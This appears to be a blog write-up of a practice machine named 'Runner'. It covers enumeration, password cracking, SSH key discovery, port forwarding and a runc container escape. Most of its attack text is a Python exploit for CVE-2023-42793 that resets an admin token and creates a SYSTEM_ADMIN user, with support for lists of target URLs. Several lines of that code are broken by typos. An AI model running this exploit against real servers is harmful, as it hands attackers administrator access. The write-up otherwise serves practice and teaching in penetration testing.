<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Runner-Linux-Medium | Pwn3d777</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Runner-Linux-Medium" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Runner" />
<meta property="og:description" content="Runner" />
<link rel="canonical" href="https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html" />
<meta property="og:url" content="https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html" />
<meta property="og:site_name" content="Pwn3d777" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-07-11T16:05:57+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Runner-Linux-Medium" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-11T16:05:57+00:00","datePublished":"2025-07-11T16:05:57+00:00","description":"Runner","headline":"Runner-Linux-Medium","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html"},"url":"https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
        
        
        
        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
<div class="post">
  <h1 class="post-title">Runner-Linux-Medium</h1>
  
  <div class="post-date">
    Published on 11 Jul 2025
    
  </div>
  
  <h1 id="runner">Runner</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
We use nmap to make port recognition
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled.png" alt="Untitled" />
<br /><br />
A http and ssh ports open, let’s see what’s going on.
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_1.png" alt="Untitled" />
<br /><br />
After a long seeking, trying to find directories or subdomains due to the web application doesn’t have any input item, we created a custom dictionary to fuzzing.
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_2.png" alt="Untitled" />
<br /><br />
Then, we use go buster and add domains with the corresponding flag
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_3.png" alt="Untitled" />
<br /><br />
A subdomain with a log in interface
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_4.png" alt="Untitled" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
A research was necessary to find a vulnerability in this version.
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_5.png" alt="Untitled" />
<br /><br />
How it works:
<br /><br /></p>
<ol>
  <li>Token Deletion: The script initiates a DELETE request to remove the user token associated the default user.</li>
  <li>Token Creation: Upon successful token deletion, a new user token is created for the same default user.</li>
  <li>User creation: Using the newly generated token, the script then creates a new user with administrative privileges.</li>
  <li>Output: Successful exploit are reported, and the compromised URLs are appended to a file ‘vulnerable.txt’.</li>
</ol>

<p><br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#To generate ramdon names
</span><span class="kn">import</span> <span class="nn">random</span>
<span class="c1">#To send http requests
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="c1">#To analyze arguments 
</span><span class="kn">import</span> <span class="nn">argparse</span>
<span class="c1">#To process xml responses
</span><span class="kn">import</span> <span class="nn">xml.etree.Element</span> <span class="n">ar</span> <span class="n">ET</span>

<span class="c1">#Define color 
</span><span class="n">Color_Off</span><span class="o">=</span><span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
<span class="n">Black</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;30m"</span>
<span class="n">Red</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;31m"</span>
<span class="n">Green</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;32m"</span>
<span class="n">Yellow</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;33m"</span>
<span class="n">Blue</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;34m"</span>
<span class="n">Purple</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;35m"</span>

<span class="k">class</span> <span class="nc">CVE_2023_42793</span><span class="p">:</span>
	<span class="c1">#Create the constructor
</span>	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="c1">#Url 
</span>		<span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="o">=</span><span class="s">""</span>
		<span class="c1">#Http request session
</span>		<span class="bp">self</span><span class="p">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
		
	<span class="k">def</span> <span class="nf">username</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">name</span> <span class="o">=</span> <span class="s">"H454NSec"</span>
		<span class="n">random_id</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
		<span class="k">return</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">name</span><span class="si">}{</span><span class="n">random_id</span><span class="si">}</span><span class="s">"</span>
	
	<span class="k">def</span> <span class="nf">delete_user_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
		<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0"</span><span class="p">,</span>
			<span class="s">"Content-Type"</span><span class="p">:</span><span class="s">"application/x-www-form-urlencoded"</span><span class="p">,</span>
			<span class="s">"Accept-Encoding"</span><span class="p">:</span><span class="s">"gzip, deflate"</span>
			<span class="p">}</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="c1">#Send a request to delete the user token
</span>			<span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">delete</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/app/rest/users/id:1/tokens/RPC2"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
			<span class="c1">#If the answer is successful
</span>			<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">204</span> <span class="ow">or</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
				<span class="bp">self</span><span class="p">.</span><span class="n">create_user_token</span><span class="p">()</span>
			
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
			<span class="k">pass</span>
			
	<span class="k">def</span> <span class="nf">create_user_token</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">"User-Agent"</span><span class="p">:</span><span class="s">"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0"</span><span class="p">,</span>
			<span class="s">"Accept-Encoding"</span><span class="p">:</span><span class="s">"gzip, deflate"</span>
		<span class="p">}</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="c1">#send a post request to create a new token
</span>			<span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/app/rest/users/id:1/tokens/RPC2"</span><span class="p">)</span>
			<span class="c1">#If the answer is successful extract token value
</span>			<span class="c1">#And create a new user
</span>			<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
				<span class="n">response_text</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span>
				<span class="n">root</span> <span class="o">=</span> <span class="n">ET</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">response_text</span><span class="p">)</span>
				<span class="n">value</span> <span class="o">=</span> <span class="n">root</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'value'</span><span class="p">)</span>
				<span class="c1">#RFC 751 open standar
</span>				<span class="k">if</span> <span class="n">value</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'eyJ0eXAiOiAiVENWMiJ9'</span><span class="p">):</span>
					<span class="bp">self</span><span class="p">.</span><span class="n">create_user</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
			<span class="k">pass</span>
			
	<span class="k">def</span> <span class="nf">create_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
		<span class="n">uname</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="p">()</span>
		<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0"</span><span class="p">,</span>
     <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"*/*"</span><span class="p">,</span>
     <span class="s">"Authorization"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
     <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">,</span>
		<span class="p">}</span>
		<span class="n">creds</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">"email"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span>
			<span class="s">"username"</span><span class="p">:</span> <span class="n">uname</span><span class="p">,</span>
			<span class="s">"password"</span><span class="p">:</span> <span class="s">"@H454NSec"</span><span class="p">,</span>
			<span class="s">"roles"</span><span class="p">:</span> <span class="p">{</span>
				<span class="s">"role"</span><span class="p">:</span> <span class="p">[{</span><span class="s">"roleId"</span><span class="p">:</span> <span class="s">"SYSTEM_ADMIN"</span><span class="p">,</span>
				<span class="s">"scope"</span><span class="p">:</span> <span class="s">"g"</span><span class="p">}]</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="c1">#Senfd a post request
</span>			<span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/app/rest/users"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">creds</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
			<span class="c1">#if the response is successful
</span>			<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
				<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">Green</span><span class="si">}</span><span class="s">[+] </span><span class="si">{</span><span class="n">Yellow</span><span class="si">}{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="s">/login.html </span><span class="si">{</span><span class="n">Green</span><span class="si">}</span><span class="s">[</span><span class="si">{</span><span class="n">uname</span><span class="si">}</span><span class="s">:@H454NSec]</span><span class="si">{</span><span class="n">Color_Off</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
				<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">vul</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">o</span><span class="p">:</span>
					<span class="n">o</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"[</span><span class="si">{</span><span class="n">uname</span><span class="si">}</span><span class="s">:@H454NSec] </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
			<span class="k">pass</span>
	<span class="c1">#if the script is execute independiently
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="c1">#Create an object to analize arguments on 
</span>	<span class="c1">#command line
</span>	<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-u'</span><span class="p">,</span> <span class="s">'--url'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Url of the web app'</span><span class="p">)</span>
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-l'</span><span class="p">,</span> <span class="s">'--list'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'List of urls'</span><span class="p">)</span>
	<span class="c1">#Analyze arguments
</span>	<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
	
	<span class="c1">#Array to save list of url's
</span>	<span class="n">db</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="n">url_list</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="nb">list</span>
	
	<span class="k">if</span> <span class="n">url_list</span><span class="p">:</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">url_list</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fr</span><span class="p">:</span>
			<span class="c1">#Read every line on the file
</span>				<span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">fr</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
					<span class="c1">#Delete blank spaces
</span>					<span class="n">db</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
			<span class="k">print</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	
	<span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">:</span>
		<span class="n">db</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
	<span class="c1">#Instantiate an object to use it
</span>	<span class="n">cve</span> <span class="o">=</span> <span class="n">CVE_2023_42793</span><span class="p">()</span>
	<span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">db</span><span class="p">:</span>
		<span class="c1">#Delete the last slash if it is present
</span>		<span class="n">url</span> <span class="o">=</span> <span class="n">ip</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="n">ip</span><span class="p">.</span><span class="n">endswitch</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span> <span class="k">else</span> <span class="n">ip</span>
		<span class="c1">#Add http is it is not present
</span>		<span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="n">startswitch</span><span class="p">(</span><span class="s">"http://"</span><span class="p">):</span>
			<span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="n">startswitch</span><span class="p">(</span><span class="s">"http://"</span><span class="p">):</span>
				<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">"</span>
		<span class="n">cve</span><span class="p">.</span><span class="n">delete_user_token</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_6.png" alt="Untitled" />
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_7.png" alt="Untitled" />
<br /><br />
We can create new projects here, this input is no sanitized but needs some files to recognize it as a repository
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_8.png" alt="Untitled" />
<br /><br />
There are some users which can be useful to enumerate users
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_9.png" alt="Untitled" />
<br /><br />
Beautiful thing happens on backup section, where we can download the .zip associated to the backup
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_10.png" alt="Untitled" />
<br /><br />
There we realize that there are some credentials, with a cryptographic algorithm defined in a column 
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_11.png" alt="Untitled" />
<br /><br />
We crack Andrew password, it was possible due to Andrew has a insecure password
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_12.png" alt="Untitled" />
<br /><br />
We could think that password will be helpful to move forward which is right but first we need get into ssh but those credentials were no useful, so we dig a little more inside and we could find a private key
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_13.png" alt="Untitled" />
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_14.png" alt="Untitled" />
<br /><br />
3.Priv esc
<br /><br />
We actually don’t have credentials so sudo -l is no possible to execute it, but we can use linpeas to enumerate the whole system.
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_15.png" alt="Untitled" />
<br /><br />
We can see a service running locally with the localport. We proceed to port forwarding using chisel
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_16.png" alt="Untitled" />
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_17.png" alt="Untitled" />
<br /><br />
Again there is a log in interface, this time we tried with Andrew credentials.
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_18.png" alt="Untitled" />
<br /><br />
The services allows to create containers and manage them
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_19.png" alt="Untitled" />
<br /><br />
This version has a vulnerability which we can exploit it through container creation process
<br /><br /></p>
<ul>
  <li>CVE-2024-21626
<br /><br />
  runc is a CLI(command line interface) tool for spawning and running containers on Linux according to the OCI(Open Container Initiative). In runc 1.1.11 and earlier, due to an internal file descriptor (Resources which are used access files) leak, an attacker could cause a newly-spawned container process (from runc exec) to have a working directory in the host filesystem namespace, allowing for a container escape by giving access to the host filesystem. The same attack could be used by a malicious image to allow a container process to gain access to the host filesystem through runc. Variants of these attacks could be also be used to overwrite semi-arbitrary host binaries, allowing for complete container escapes.
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_20.png" alt="Untitled" />
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_21.png" alt="Untitled" />
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_22.png" alt="Untitled" />
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_23.png" alt="Untitled" />
<br /><br />
<img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_24.png" alt="Untitled" />
<br /><br />
Machine pwned@W
<script src="/assets/js/matrix-overlay.js"></script></li>
</ul>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html';
     this.page.identifier = '/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778';
     this.page.title = 'Runner-Linux-Medium';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/writeups/2025/08/09/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4.html">
            University-Windows-Insane
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/08/04/d2fd2792-68e0-4168-9904-f90f3bf63609-export-0ee8c1a5-de29-43f8-b0f4-339fa55d28de.html">
            Code-Linux-Easy
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/07/26/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947.html">
            Cypher-Linux-Medium
          </a>
        </h3>
      </li>
    
  </ul>
</div>






<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
